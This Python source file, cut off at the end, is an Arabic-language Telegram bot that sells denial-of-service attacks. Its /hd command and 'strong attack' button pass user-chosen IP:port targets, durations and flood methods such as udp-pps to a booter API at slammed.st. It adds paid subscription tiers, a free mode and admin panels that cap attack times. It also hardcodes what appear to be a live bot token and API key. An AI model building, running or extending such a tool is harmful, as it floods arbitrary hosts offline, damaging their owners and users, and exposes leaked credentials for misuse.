import logging
import requests
import re
import time
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    ChatJoinRequestHandler,
    ContextTypes, 
    filters
)

# ----------------- الإعدادات والتوكنات -----------------
BOT_TOKEN = "7624708352:AAGfIuOPzQNSwNXps7y9FVh3ddgKUt3Bz9A"
API_KEY = "slm_s5pakHcLKZnvxJfiTGI22Q-9sAFQc_cF"

DEVELOPER_ID = 7493679412  # ⚠️ استبدل هذا الرقم بأيدي المطور الأساسي (المالك)
DEVELOPER_USERNAME = "z_zgz"
DEVELOPER_LINK = f"https://t.me/{DEVELOPER_USERNAME}"

USER_COOLDOWN_SECONDS = 60
STRONG_ATTACK_COOLDOWN_SECONDS = 120  # وقت الانتظار للهجوم القوي (120 ثانية)

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# ----------------- متغيرات النظام (تُحفظ في الذاكرة) -----------------
CURRENT_ANIMATION_ID = None
FREE_MODE_ENABLED = False
FREE_MODE_MAX_TIME = 30  

MAX_TIME_REGULAR = 120
MAX_TIME_VIP = 300

ACTIVATED_GROUPS = {}  # {chat_id: {"title": str, "max_time": int}}
CHANNELS_DB = {}       # {"db_key": {"name": str, "link": str, "chat_id": str|int}}
SUBSCRIBERS_DB = {}    # {user_id: {"name": str, "username": str, "type": "REGULAR"|"VIP", "joined_at": str, "expires_at": datetime}}

# قائمة بحفظ أيديات المستخدمين الذين أرسلوا طلب انضمام
JOIN_REQUESTS_USER_IDS = set()

DEVELOPERS_LIST = [DEVELOPER_ID]
PROTECTED_TARGETS = []
NOTIFICATION_USERS = set()

ACTIVE_ATTACKS = []
USER_LAST_ATTACK = {}
USER_LAST_STRONG_ATTACK = {}

def is_developer(user_id: int) -> bool:
    return user_id in DEVELOPERS_LIST

def clean_markdown(text: str) -> str:
    return str(text).replace("_", r"\_")

def cleanup_active_attacks():
    global ACTIVE_ATTACKS
    now = time.time()
    ACTIVE_ATTACKS = [exp_time for exp_time in ACTIVE_ATTACKS if exp_time > now]

# ----------------- فحص وتنظيف اشتراكات المشتركين -----------------
def check_user_subscription(user_id: int) -> tuple[bool, str, str]:
    if is_developer(user_id):
        return True, "مطور البوت 👨‍💻", "غير محدود"
        
    if user_id in SUBSCRIBERS_DB:
        user_info = SUBSCRIBERS_DB[user_id]
        if datetime.now() < user_info["expires_at"]:
            exp_str = user_info["expires_at"].strftime("%Y-%m-%d %H:%M")
            return True, user_info["type"], exp_str
        else:
            del SUBSCRIBERS_DB[user_id]
            
    if FREE_MODE_ENABLED:
        return True, "مجاني 🆓", "مفعل للجميع"
        
    return False, "غير مشترك ❌", "غير محدد"

# ----------------- فحص الاشتراك الإجباري المعدل لروابط طلب الانضمام -----------------
async def is_user_subscribed(bot, user_id: int) -> tuple[bool, list]:
    missing_channels = []
    
    for ch_key, ch_data in CHANNELS_DB.items():
        channel_name = ch_data.get("name", "قناة/مجموعة")
        channel_link = ch_data.get("link", "")
        chat_target = ch_data.get("chat_id", ch_key)

        # 1. إذا كان المستخدم مسجلاً في القائمة التلقائية لطلبات الانضمام
        if user_id in JOIN_REQUESTS_USER_IDS:
            continue

        # 2. إذا كان المدخل رابط طلب انضمام وليس آيدي مباشر
        if str(chat_target).startswith("http") or "+" in str(chat_target):
            missing_channels.append((channel_name, channel_link))
            continue

        # 3. الفحص عبر Telegram API المباشر
        try:
            member = await bot.get_chat_member(chat_id=chat_target, user_id=user_id)
            # إذا كان العضو مقيد، غادر، أو تم طرده
            if member.status in ['left', 'kicked']:
                missing_channels.append((channel_name, channel_link))
        except Exception as e:
            # إذا تعذر الحصول على الحالة وكان هناك طلب انضمام معلق
            if user_id in JOIN_REQUESTS_USER_IDS:
                continue
            logging.error(f"Error checking membership for {ch_key}: {e}")
            missing_channels.append((channel_name, channel_link))
            
    return len(missing_channels) == 0, missing_channels

def get_join_buttons(missing_channels):
    keyboard = []
    for channel_name, channel_link in missing_channels:
        url = channel_link if channel_link else DEVELOPER_LINK
        keyboard.append([InlineKeyboardButton(text=f"📢 طلب انضمام/اشتراك: {channel_name}", url=url)])
    keyboard.append([InlineKeyboardButton(text="🔄 تحقق من الانضمام", callback_data="check_subscription")])
    return InlineKeyboardMarkup(keyboard)

# ----------------- معالجة طلبات الانضمام تلقائياً -----------------
async def track_join_requests(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.chat_join_request:
        user_id = update.chat_join_request.from_user.id
        JOIN_REQUESTS_USER_IDS.add(user_id)
        logging.info(f"Received join request from user {user_id}")

# ----------------- لوحات التحكم والأزرار -----------------
def get_main_keyboard(user_id: int):
    keyboard = []
    is_sub, _, _ = check_user_subscription(user_id)

    if is_sub or is_developer(user_id) or FREE_MODE_ENABLED:
        keyboard.append([InlineKeyboardButton("الهجوم القوي ⚡", callback_data="btn_strong_attack")])

    if is_developer(user_id):
        notif_text = "جرس التنبيهات 🔔 (مفعل)" if user_id in NOTIFICATION_USERS else "جرس التنبيهات 🔕 (معطل)"
        keyboard.append([InlineKeyboardButton(notif_text, callback_data="toggle_notif")])
        keyboard.append([
            InlineKeyboardButton("إضافة حماية 🛡", callback_data="add_protection"), 
            InlineKeyboardButton("عرض الأهداف المحمية 📋", callback_data="show_protected")
        ])
        keyboard.append([InlineKeyboardButton("⚙️ لوحة تحكم المطور", callback_data="open_admin_panel")])
    else:
        keyboard.append([InlineKeyboardButton("المطور 👨‍💻", url=DEVELOPER_LINK)])

    return InlineKeyboardMarkup(keyboard)

def get_admin_keyboard():
    free_status = f"مفعل ✅ ({FREE_MODE_MAX_TIME}s)" if FREE_MODE_ENABLED else "معطل ❌"
    keyboard = [
        [InlineKeyboardButton("➕ إضافة مشترك عادي", callback_data="add_sub_regular"), InlineKeyboardButton("⭐ إضافة مشترك VIP", callback_data="add_sub_vip")],
        [InlineKeyboardButton("👥 عرض المشتركين وإدارتهم", callback_data="manage_subscribers")],
        [InlineKeyboardButton("➕ إضافة مطور", callback_data="add_dev"), InlineKeyboardButton("➖ حذف مطور", callback_data="del_dev")],
        [InlineKeyboardButton("👥 عرض المطورين", callback_data="list_devs")],
        [InlineKeyboardButton(f"الوضع المجاني: {free_status}", callback_data="toggle_free_mode")],
        [InlineKeyboardButton("المجموعات المفعلة 👥", callback_data="list_groups")],
        [InlineKeyboardButton("إدارة الاشتراك الإجباري 📢", callback_data="manage_channels")],
        [InlineKeyboardButton("تغيير المتحركة 🎬", callback_data="set_animation")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ----------------- الأوامر الرئيسية -----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    if update.effective_chat.type == "private" and not is_developer(user_id):
        subscribed, missing = await is_user_subscribed(context.bot, user_id)
        if not subscribed:
            reply_markup = get_join_buttons(missing)
            await update.message.reply_text(
                "⚠️ **عذراً! يجب عليك الانضمام/إرسال طلب انضمام في القنوات التالية:**",
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
            return

    _, sub_type, exp_date = check_user_subscription(user_id)

    start_text = (
        f"- مرحبا بك {user.first_name} في بوت ضرب الاتصالات 🔥\n\n"
        f"- نوع اشتراكك ({sub_type})\n\n"
        f"- تاريخ انتهاء اشتراكك ({exp_date})\n\n"
        f"- لتنفيذ الهجوم ارسل /hd أو استخدم زر الهجوم القوي ⚡"
    )

    await update.message.reply_text(start_text, reply_markup=get_main_keyboard(user_id))

async def open_group_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    user = update.effective_user

    if chat.type == "private":
        await update.message.reply_text("⚠ هذا الأمر يتم استخدامه داخل المجموعات فقط.")
        return

    if not is_developer(user.id):
        await update.message.reply_text("🚫 هذا الأمر مخصص للمطور فقط.")
        return

    bot_member = await chat.get_member(context.bot.id)
    if bot_member.status not in ["administrator", "creator"]:
        await update.message.reply_text("⚠️ يرجى رفع البوت مشرفاً في المجموعة أولاً ثم أعد /open.")
        return

    context.user_data["awaiting_group_max_time"] = chat.id
    context.user_data["group_title"] = chat.title
    await update.message.reply_text(
        f"⚙️ **تفعيل البوت في مجموعة: {chat.title}**\n\n"
        "يرجى إرسال **أقصى وقت للهجوم (بالثواني)** المسموح به للأعضاء:",
        parse_mode="Markdown"
    )

def get_possible_layer_formats(method: str):
    method_lower = method.lower()
    l7_keywords = ["http", "tls", "bypass", "flood", "cf", "browser", "get", "post"]
    if any(k in method_lower for k in l7_keywords):
        return ["L7", "l7", "7", "layer7", "Layer7"]
    return ["L4", "l4", "4", "layer4", "Layer4"]

# ----------------- تنفيذ الهجوم بالـ API -----------------
async def execute_attack_request(bot, chat_id, user, host, port, requested_time, method):
    global CURRENT_ANIMATION_ID, ACTIVE_ATTACKS, USER_LAST_ATTACK

    user_id = user.id
    target_str = f"{host}:{port}"

    if target_str in PROTECTED_TARGETS or host in PROTECTED_TARGETS:
        await bot.send_message(chat_id=chat_id, text="هذا الهدف محمي 🛡")
        return

    cleanup_active_attacks()
    layer_formats = get_possible_layer_formats(method)
    
    success = False
    is_concurrent_full = False
    api_error_message = ""

    for fmt in layer_formats:
        full_url = (
            f"https://slammed.st/api/v1/tasks/start"
            f"?key={API_KEY}"
            f"&layer={fmt}"
            f"&target={host}"
            f"&port={port}"
            f"&time={requested_time}"
            f"&method={method}"
            f"&concurrents=1"
        )
        try:
            response = requests.get(full_url, timeout=10)
            data = response.json()
            if isinstance(data, dict):
                if data.get("field") == "concurrents" or "concurrent slots" in data.get("message", ""):
                    is_concurrent_full = True
                    break
                elif data.get("ok") is True:
                    success = True
                    break
                else:
                    api_error_message = data.get("message", "")
        except Exception as e:
            logging.error(f"API Request failed: {e}")

    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("المطور 👨‍💻", url=DEVELOPER_LINK)]])

    if is_concurrent_full:
        cleanup_active_attacks()
        if ACTIVE_ATTACKS:
            min_exp = min(ACTIVE_ATTACKS)
            wait_seconds = max(1, int(min_exp - time.time()))
        else:
            wait_seconds = int(requested_time)

        busy_msg = (
            f"🚨 **هناك هجوم قيد التنفيذ حالياً!**\n\n"
            f"السيرفر مشغول بأقصى عدد هجمات مسموح به.\n"
            f"⏳ **الوقت المتبقي لتتمكن من استخدام البوت:** `{wait_seconds}` ثانية."
        )
        await bot.send_message(chat_id=chat_id, text=busy_msg, parse_mode="Markdown")
        return

    elif success:
        expire_time = time.time() + int(requested_time)
        ACTIVE_ATTACKS.append(expire_time)
        USER_LAST_ATTACK[user_id] = time.time()

        caption_text = (
            "تم تنفيذ الهجوم بنجاح 🔥\n"
            "________________________________\n\n"
            f"IP ⌯ {host}\n\n"
            f"Port ⌯ {port}\n\n"
            f"Time ⌯ {requested_time}\n\n"
            f"MeThOdS ⌯ {method.upper()}\n"
            "________________________________"
        )

        notif_msg = (
            f"🔔 **تنبيه هجوم جديد!**\n\n"
            f"👤 المنفذ: {user.first_name} (`{user_id}`)\n"
            f"🎯 الهدف: `{target_str}`\n"
            f"⏱ المدة: `{requested_time}` ثانية\n"
            f"🛠 الطريقة: `{method.upper()}`"
        )
        for notify_id in NOTIFICATION_USERS:
            try:
                await bot.send_message(chat_id=notify_id, text=notif_msg, parse_mode="Markdown")
            except Exception:
                pass
    else:
        caption_text = f"🚨 فشل تنفيذ الهجوم!\nالسبب: {api_error_message or 'هذا الهدف تحت الهجوم أو الخادم غير مستجيب حاول بعد 60 ثانية'}"

    if CURRENT_ANIMATION_ID and success:
        try:
            await bot.send_animation(
                chat_id=chat_id,
                animation=CURRENT_ANIMATION_ID,
                caption=caption_text,
                reply_markup=keyboard
            )
            return
        except Exception:
            pass

    await bot.send_message(chat_id=chat_id, text=caption_text, reply_markup=keyboard)

# ----------------- معالجة أمر الهجوم العادي /hd -----------------
async def handle_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user = update.effective_user
    user_id = user.id
    now_ts = time.time()

    if not is_developer(user_id):
        subscribed, missing = await is_user_subscribed(context.bot, user_id)
        if not subscribed:
            reply_markup = get_join_buttons(missing)
            await update.message.reply_text(
                "⚠ **يجب عليك إرسال طلب انضمام/الاشتراك في القنوات لاستخدام الأمر:**",
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
            return

    is_sub, sub_type, _ = check_user_subscription(user_id)
    allowed_max_time = None

    if is_developer(user_id):
        allowed_max_time = 3600
    elif is_sub and sub_type in ["REGULAR", "VIP"]:
        allowed_max_time = MAX_TIME_VIP if sub_type == "VIP" else MAX_TIME_REGULAR
    elif chat_id in ACTIVATED_GROUPS:
        allowed_max_time = ACTIVATED_GROUPS[chat_id]["max_time"]
    elif FREE_MODE_ENABLED:
        allowed_max_time = FREE_MODE_MAX_TIME
    else:
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("المطور 👨‍💻", url=DEVELOPER_LINK)]])
        await update.message.reply_text("🚫 البوت غير مصرح لك، تواصل مع المطور أدناه.", reply_markup=keyboard)
        return

    if not is_developer(user_id) and user_id in USER_LAST_ATTACK:
        elapsed = now_ts - USER_LAST_ATTACK[user_id]
        if elapsed < USER_COOLDOWN_SECONDS:
            remaining_cd = int(USER_COOLDOWN_SECONDS - elapsed)
            await update.message.reply_text(
                f"⏳ **يجب عليك الانتظار `{remaining_cd}` ثانية قبل إرسال هجوم آخر!**",
                parse_mode="Markdown"
            )
            return

    if len(context.args) < 4:
        error_msg = (
            "⚠ **خطأ في صيغة الأمر!**\n\n"
            "الصيغة الصحيحة:\n"
            "`/hd <ip> <port> <time> <method>`\n\n"
            "مثال:\n"
            "`/hd 1.2.3.4 53 30 udp-pps`"
        )
        await update.message.reply_text(error_msg, parse_mode="Markdown")
        return

    host = context.args[0]
    port = context.args[1]
    requested_time = context.args[2]
    method = context.args[3]

    try:
        req_time_int = int(requested_time)
        if req_time_int > allowed_max_time:
            await update.message.reply_text(
                f"⚠ **تم تجاوز أقصى وقت مسموح به!**\n"
                f"أقصى وقت مسموح لك حالياً هو: `{allowed_max_time}` ثانية.",
                parse_mode="Markdown"
            )
            return
    except ValueError:
        await update.message.reply_text("⚠️ يرجى إدخال الوقت كأرقام فقط.")
        return

    await execute_attack_request(context.bot, chat_id, user, host, port, requested_time, method)

# ----------------- معالج الأزرار الشفافة -----------------
async def button_click_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global FREE_MODE_ENABLED, FREE_MODE_MAX_TIME, CHANNELS_DB, MAX_TIME_REGULAR, MAX_TIME_VIP

    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "check_subscription":
        subscribed, missing = await is_user_subscribed(context.bot, user_id)
        if subscribed:
            await query.edit_message_text("✅ تم التحقق بنجاح! تم قبول/تسجيل اشتراكك، يمكنك استخدام البوت الآن.")
        else:
            reply_markup = get_join_buttons(missing)
            await query.edit_message_text(
                "❌ **لم يتم العثور على طلب انضمامك أو اشتراكك!**\n"
                "تأكد من الضغط على زر القناة وإرسال طلب الانضمام ثم اضغط تحقق مرة أخرى:",
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
        return

    # --- معالجة زر الهجوم القوي ⚡ ---
    if data == "btn_strong_attack":
        is_sub, _, _ = check_user_subscription(user_id)
        if not (is_sub or is_developer(user_id) or FREE_MODE_ENABLED):
            await query.message.reply_text("❌ هذه الميزة مخصصة للمشتركين أو أثناء تفعيل الوضع المجاني فقط.")
            return

        now_ts = time.time()
        if not is_developer(user_id) and user_id in USER_LAST_STRONG_ATTACK:
            elapsed = now_ts - USER_LAST_STRONG_ATTACK[user_id]
            if elapsed < STRONG_ATTACK_COOLDOWN_SECONDS:
                remaining = int(STRONG_ATTACK_COOLDOWN_SECONDS - elapsed)
                await query.answer(f"⏳ يرجى الانتظار {remaining} ثانية لاستخدام الهجوم القوي مرة أخرى!", show_alert=True)
                return

        context.user_data["awaiting_strong_attack_target"] = True
        await query.message.reply_text(
            "⚡ **إطلاق الهجوم القوي (Layer 4):**\n\n"
            "أرسل الـ IP والـ Port الآن بالصيغة التالية:\n"
            "`IP:PORT` (مثال: `1.2.3.4:80`)\n\n"
            "📌 *سيتم إطلاق أقوى طريقة Layer 4 لمدة 60 ثانية تلقائياً.*",
            parse_mode="Markdown"
        )
        return

    if not is_developer(user_id):
        await query.message.reply_text("🚫 هذه الميزة مخصصة للمطورين فقط.")
        return

    if data == "toggle_notif":
        if user_id in NOTIFICATION_USERS:
            NOTIFICATION_USERS.remove(user_id)
            await query.answer("تم إيقاف التنبيهات 🔕", show_alert=True)
        else:
            NOTIFICATION_USERS.add(user_id)
            await query.answer("تم تفعيل التنبيهات 🔔", show_alert=True)
        await query.edit_message_reply_markup(reply_markup=get_main_keyboard(user_id))
        return

    elif data == "add_protection":
        context.user_data["awaiting_prot_add"] = True
        await query.message.reply_text("أرسل الهدف المراد حمايته بصيغة:\n`IP:PORT` (مثال: `1.1.1.1:80`)", parse_mode="Markdown")
        return

    elif data == "show_protected":
        if not PROTECTED_TARGETS:
            await query.answer("لا توجد أهداف محمية حالياً.", show_alert=True)
            return
        keyboard = []
        for target in PROTECTED_TARGETS:
            keyboard.append([InlineKeyboardButton(f"❌ حذف {target}", callback_data=f"del_prot_{target}")])
        await query.message.reply_text("🛡 **قائمة الأهداف المحمية:**\nاضغط لإزالة الحماية:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        return

    elif data.startswith("del_prot_"):
        target = data.replace("del_prot_", "")
        if target in PROTECTED_TARGETS:
            PROTECTED_TARGETS.remove(target)
            await query.answer(f"تم إزالة الحماية عن {target} ✅", show_alert=True)
            await query.message.delete()
        return

    if data == "open_admin_panel":
        await query.message.reply_text("⚙️ **لوحة تحكم المطور:**", reply_markup=get_admin_keyboard())

    elif data == "add_dev":
        context.user_data["awaiting_dev_add"] = True
        await query.message.reply_text("أرسل أيدي (ID) الشخص لإضافته كمطور:")

    elif data == "del_dev":
        context.user_data["awaiting_dev_del"] = True
        await query.message.reply_text("أرسل أيدي (ID) المطور لحذفه:")

    elif data == "list_devs":
        dev_text = "👥 **قائمة المطورين:**\n\n" + "\n".join([f"• `{d}`" for d in DEVELOPERS_LIST])
        await query.message.reply_text(dev_text, parse_mode="Markdown")

    elif data == "add_sub_regular":
        context.user_data["awaiting_sub_add"] = "REGULAR"
        await query.message.reply_text(
            "➕ **إضافة مشترك عادي:**\n\n"
            "أرسل الأيدي والمدة بالصيغة التالية:\n`ID:المدة`\n\n"
            "أمثلة:\n• لـ 3 أيام: `123456789:3d`\n• لـ 12 ساعة: `123456789:12h`",
            parse_mode="Markdown"
        )

    elif data == "add_sub_vip":
        context.user_data["awaiting_sub_add"] = "VIP"
        await query.message.reply_text(
            "⭐ **إضافة مشترك VIP:**\n\n"
            "أرسل الأيدي والمدة بالصيغة التالية:\n`ID:المدة`\n\n"
            "أمثلة:\n• لـ 7 أيام: `123456789:7d`\n• لـ 24 ساعة: `123456789:24h`",
            parse_mode="Markdown"
        )

    elif data == "manage_subscribers":
        keyboard = [
            [InlineKeyboardButton("🗑 حذف مشترك", callback_data="btn_delete_sub")],
            [InlineKeyboardButton(f"⏱ أقصى وقت عادي ({MAX_TIME_REGULAR}s)", callback_data="set_max_regular")],
            [InlineKeyboardButton(f"⚡ أقصى وقت VIP ({MAX_TIME_VIP}s)", callback_data="set_max_vip")],
            [InlineKeyboardButton("🔙 العودة", callback_data="back_to_admin")]
        ]
        if not SUBSCRIBERS_DB:
            text = "👥 **لوحة المشتركين:**\n\n❌ لا يوجد مشتركين حالياً."
        else:
            text = "📋 **قائمة المشتركين الحاليين:**\n\n"
            now = datetime.now()
            for s_id, s_info in list(SUBSCRIBERS_DB.items()):
                if now > s_info["expires_at"]:
                    del SUBSCRIBERS_DB[s_id]
                    continue
                remaining = s_info["expires_at"] - now
                days, hours = remaining.days, remaining.seconds // 3600
                text += (
                    f"👤 **الاسم:** {s_info['name']}\n"
                    f"🔗 **اليوزر:** {s_info['username']}\n"
                    f"🆔 **الأيدي:** `{s_id}`\n"
                    f"🏷 **النوع:** {s_info['type']}\n"
                    f"📅 **تاريخ الاشتراك:** `{s_info['joined_at']}`\n"
                    f"⏳ **المتبقي:** {days} يوم و {hours} ساعة\n"
                    "----------------------------------\n"
                )
        await query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif data == "btn_delete_sub":
        if not SUBSCRIBERS_DB:
            await query.message.reply_text("❌ لا يوجد مشتركين لحذفهم.")
            return
        keyboard = []
        for s_id, s_info in SUBSCRIBERS_DB.items():
            keyboard.append([InlineKeyboardButton(f"❌ حذف: {s_info['name']} ({s_id})", callback_data=f"del_user_{s_id}")])
        keyboard.append([InlineKeyboardButton("🔙 العودة", callback_data="manage_subscribers")])
        await query.message.reply_text("اختر المشترك المراد حذفه:", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data.startswith("del_user_"):
        target_u_id = int(data.replace("del_user_", ""))
        if target_u_id in SUBSCRIBERS_DB:
            del SUBSCRIBERS_DB[target_u_id]
            await query.message.reply_text(f"✅ تم حذف المشترك `{target_u_id}` بنجاح.", parse_mode="Markdown")

    elif data == "set_max_regular":
        context.user_data["awaiting_max_regular"] = True
        await query.message.reply_text("⏱ أدخل أقصى وقت هجوم مسموح للمشترك العادي (بالثواني):")

    elif data == "set_max_vip":
        context.user_data["awaiting_max_vip"] = True
        await query.message.reply_text("⚡ أدخل أقصى وقت هجوم مسموح لمشترك VIP (بالثواني):")

    elif data == "toggle_free_mode":
        if not FREE_MODE_ENABLED:
            context.user_data["awaiting_free_mode_time"] = True
            await query.message.reply_text("⚙️ **تفعيل الوضع المجاني:** أدخل أقصى وقت هجوم (بالثواني):", parse_mode="Markdown")
        else:
            FREE_MODE_ENABLED = False
            await query.message.edit_reply_markup(reply_markup=get_admin_keyboard())
            await query.message.reply_text("❌ تم إيقاف الوضع المجاني بنجاح.")

    elif data == "list_groups":
        if not ACTIVATED_GROUPS:
            await query.message.reply_text("ℹ️ لا توجد مجموعات مفعلة حالياً.")
            return
        buttons = []
        for g_id, g_info in ACTIVATED_GROUPS.items():
            buttons.append([InlineKeyboardButton(f"❌ تعطيل: {g_info['title']} ({g_info['max_time']}s)", callback_data=f"disable_group_{g_id}")])
        buttons.append([InlineKeyboardButton("🔙 العودة", callback_data="back_to_admin")])
        await query.message.reply_text("👥 **المجموعات المفعلة:**", reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")

    elif data.startswith("disable_group_"):
        target_g_id = int(data.replace("disable_group_", ""))
        if target_g_id in ACTIVATED_GROUPS:
            g_name = ACTIVATED_GROUPS[target_g_id]["title"]
            del ACTIVATED_GROUPS[target_g_id]
            await query.message.reply_text(f"✅ تم تعطيل البوت في مجموعة: {g_name}")

    elif data == "manage_channels":
        keyboard = [
            [InlineKeyboardButton("➕ إضافة قناة/مجموعة", callback_data="admin_add_ch")],
            [InlineKeyboardButton("📜 عرض القنوات", callback_data="admin_list_ch")],
            [InlineKeyboardButton("❌ حذف قناة", callback_data="admin_del_ch")],
            [InlineKeyboardButton("🔙 العودة", callback_data="back_to_admin")]
        ]
        await query.message.reply_text("📢 **لوحة تحكم قنوات الاشتراك الإجباري:**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif data == "admin_add_ch":
        context.user_data['awaiting_add_channel'] = True
        await query.message.reply_text(
            "✏️ **أرسل يوزر القناة، الأيدي (ID)، أو رابط الانضمام:**\n\n"
            "مثال للرابط الخاص/طلب الانضمام:\n"
            "`https://t.me/+AbCdEfGhIjKlMnOp`\n\n"
            "⚠ **مهم جداً:** ليتعرف البوت على الطلبات أضف البوت مشرفاً بالكامل في القناة/المجموعة ومنحه صلاحية (إدارة طلبات الانضمام).", 
            parse_mode="Markdown"
        )

    elif data == "admin_list_ch":
        if not CHANNELS_DB:
            await query.message.reply_text("❌ لا توجد قنوات مضافة حالياً.")
            return
        text = "📋 **قائمة القنوات/المجموعات المضافة:**\n\n"
        for ch_key, ch_info in CHANNELS_DB.items():
            text += f"• **{clean_markdown(ch_info['name'])}**\n  الرابط: {ch_info['link']}\n"
        await query.message.reply_text(text, parse_mode="Markdown")

    elif data == "admin_del_ch":
        if not CHANNELS_DB:
            await query.message.reply_text("❌ لا توجد قنوات لحذفها.")
            return
        keyboard = [[InlineKeyboardButton(f"🗑 حذف {ch_info['name']}", callback_data=f"del_ch_{ch_key}")] for ch_key, ch_info in CHANNELS_DB.items()]
        keyboard.append([InlineKeyboardButton("🔙 العودة", callback_data="manage_channels")])
        await query.message.reply_text("اختر القناة المراد حذفها:", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data.startswith("del_ch_"):
        ch_to_del = data.replace("del_ch_", "")
        if ch_to_del in CHANNELS_DB:
            deleted_name = CHANNELS_DB[ch_to_del]['name']
            del CHANNELS_DB[ch_to_del]
            await query.message.reply_text(f"✅ تم حذف القناة `{clean_markdown(deleted_name)}` بنجاح.", parse_mode="Markdown")

    elif data == "set_animation":
        context.user_data["awaiting_animation"] = True
        await query.message.reply_text("🎬 **أرسل المتحركة (GIF) أو الفيديو القصير الآن:**")

    elif data == "back_to_admin":
        await query.message.edit_reply_markup(reply_markup=get_admin_keyboard())

# ----------------- معالج المدخلات النصية -----------------
async def text_input_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global FREE_MODE_ENABLED, FREE_MODE_MAX_TIME, ACTIVATED_GROUPS, CHANNELS_DB, MAX_TIME_REGULAR, MAX_TIME_VIP, USER_LAST_STRONG_ATTACK

    user = update.effective_user
    user_id = user.id
    text = update.message.text.strip()

    # --- استلام مدخلات زر الهجوم القوي ---
    if context.user_data.get("awaiting_strong_attack_target"):
        if ":" in text:
            try:
                host, port = text.split(":", 1)
                host = host.strip()
                port = port.strip()

                context.user_data["awaiting_strong_attack_target"] = False
                USER_LAST_STRONG_ATTACK[user_id] = time.time()

                strong_method = "udp-pps"
                strong_time = "60"

                await update.message.reply_text(f"⚡ **جاري إطلاق الهجوم القوي على:** `{host}:{port}`...", parse_mode="Markdown")
                await execute_attack_request(context.bot, update.effective_chat.id, user, host, port, strong_time, strong_method)
                return
            except Exception:
                await update.message.reply_text("⚠️ حدث خطأ في تحليل الهدف! أرسل بصيغة: `IP:PORT`", parse_mode="Markdown")
                return
        else:
            await update.message.reply_text("⚠ صيغة خاطئة! أرسل بصيغة: `IP:PORT` (مثال: `1.2.3.4:80`)", parse_mode="Markdown")
            return

    if not is_developer(user_id):
        return

    # --- إضافة قناة بجميع الصيغ ---
    if context.user_data.get("awaiting_add_channel"):
        context.user_data["awaiting_add_channel"] = False
        
        target_chat_id = None
        target_link = text
        target_name = "قناة/مجموعة (طلب انضمام)"

        if "t.me/" in text or "telegram.me/" in text:
            if "+" in text or "joinchat" in text:
                target_chat_id = text
                target_name = "قناة/مجموعة (رابط خاص/طلب انضمام)"
            else:
                match = re.search(r't\.me/([^/+]+)$', text)
                if match:
                    username = match.group(1)
                    target_chat_id = f"@{username}"
                else:
                    target_chat_id = text

        elif re.match(r"^-?\d+$", text):
            target_chat_id = int(text)
            clean_id = str(text).replace("-100", "")
            target_link = f"https://t.me/c/{clean_id}/1"

        else:
            username = text if text.startswith("@") else f"@{text}"
            target_chat_id = username
            target_link = f"https://t.me/{username.replace('@', '')}"

        if not str(target_chat_id).startswith("http") and "+" not in str(target_chat_id):
            try:
                chat_info = await context.bot.get_chat(target_chat_id)
                target_name = chat_info.title or target_name
                target_chat_id = chat_info.id
            except Exception as e:
                logging.warning(f"Could not fetch chat details: {e}")

        db_key = str(target_chat_id)
        CHANNELS_DB[db_key] = {
            "name": target_name,
            "link": target_link,
            "chat_id": target_chat_id
        }

        display_title = clean_markdown(target_name)
        
        await update.message.reply_text(
            f"✅ **تمت إضافة القناة/المجموعة بنجاح!**\n\n"
            f"📢 **الاسم:** {display_title}\n"
            f"🔗 **الرابط:** {target_link}\n\n"
            f"⚠ **ملاحظة هامّة:** تأكد من رفع البوت مشرفاً في القناة/المجموعة وإعطائه صلاحية **إدارة طلبات الانضمام (Approve Join Requests)** ليعمل النظام بدون مشاكل.",
            parse_mode="Markdown"
        )

    elif context.user_data.get("awaiting_prot_add"):
        if ":" in text:
            PROTECTED_TARGETS.append(text)
            context.user_data["awaiting_prot_add"] = False
            await update.message.reply_text(f"تمت إضافة الهدف `{text}` إلى قائمة الحماية بنجاح 🛡", parse_mode="Markdown")
        else:
            await update.message.reply_text("⚠ صيغة خاطئة! أرسل بالشكل: `IP:PORT`")

    elif context.user_data.get("awaiting_dev_add"):
        try:
            new_dev = int(text)
            if new_dev not in DEVELOPERS_LIST:
                DEVELOPERS_LIST.append(new_dev)
                await update.message.reply_text(f"تمت إضافة `{new_dev}` كـ مطور بنجاح ✅", parse_mode="Markdown")
            else:
                await update.message.reply_text("هذا المستخدم مطور بالفعل!")
        except ValueError:
            await update.message.reply_text("⚠ يرجى إدخال آيدي صحيح.")
        context.user_data["awaiting_dev_add"] = False

    elif context.user_data.get("awaiting_dev_del"):
        try:
            dev_id = int(text)
            if dev_id == DEVELOPER_ID:
                await update.message.reply_text("❌ لا يمكنك حذف المطور الأساسي!")
            elif dev_id in DEVELOPERS_LIST:
                DEVELOPERS_LIST.remove(dev_id)
                await update.message.reply_text(f"تم حذف المطور `{dev_id}` بنجاح 🗑", parse_mode="Markdown")
            else:
                await update.message.reply_text("هذا الآيدي غير موجود بالقائمة!")
        except ValueError:
            await update.message.reply_text("⚠️ يرجى إدخال آيدي صحيح.")
        context.user_data["awaiting_dev_del"] = False

    elif context.user_data.get("awaiting_sub_add"):
